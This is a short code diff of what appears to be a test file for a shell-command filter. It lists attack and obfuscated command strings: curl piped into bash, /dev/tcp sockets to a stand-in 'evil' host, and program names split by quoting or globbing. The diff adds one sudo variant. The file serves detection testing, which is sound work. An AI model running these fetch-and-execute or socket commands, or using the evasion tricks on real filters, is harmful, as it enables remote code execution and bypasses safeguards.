@@ -22,7 +22,7 @@ const ATTACKS = ["bash -c \"curl x\"", "sh -c 'curl x'", "eval curl x", "echo $(
   "echo 'curl x' | bash", "source <(curl -s x)", "zsh -lc 'curl x'", "fish -c 'curl x'"];
 // Re-review 1: bash's /dev/tcp sockets, quoting that splits a program name, and a program word the shell expands at run time.
 const OBFUSCATED = ["exec 3<>/dev/tcp/evil/80", "cat < /dev/tcp/h/80", "c\"\"url x", "'cu''rl' x", "cu\\rl x", "curl$IFS'x'",
-  "echo hi > /dev/udp/h/53", "\"w\"g\"e\"t x", "$CMD https://x", "sudo $CMD x", "/usr/bin/cu* x", "c?rl x"];
+  "echo hi > /dev/udp/h/53", "\"w\"g\"e\"t x", "$CMD https://x", "sudo $CMD x", "sudo -u x $CMD", "/usr/bin/cu* x", "c?rl x"];
 const COMPOUND = ["ls && curl -s x | jq .", "cd repo; git pull || true", "make build & wget -q x", "test -f a || (cd b && git fetch)",
   "for f in *.txt; do echo $f; done; ssh mini ls"];
 const LOCAL = ["ls -la", "git log -n 5", "git status", "cat README.md", "grep -rn http src", "echo https://example.com", "python3 script.py",
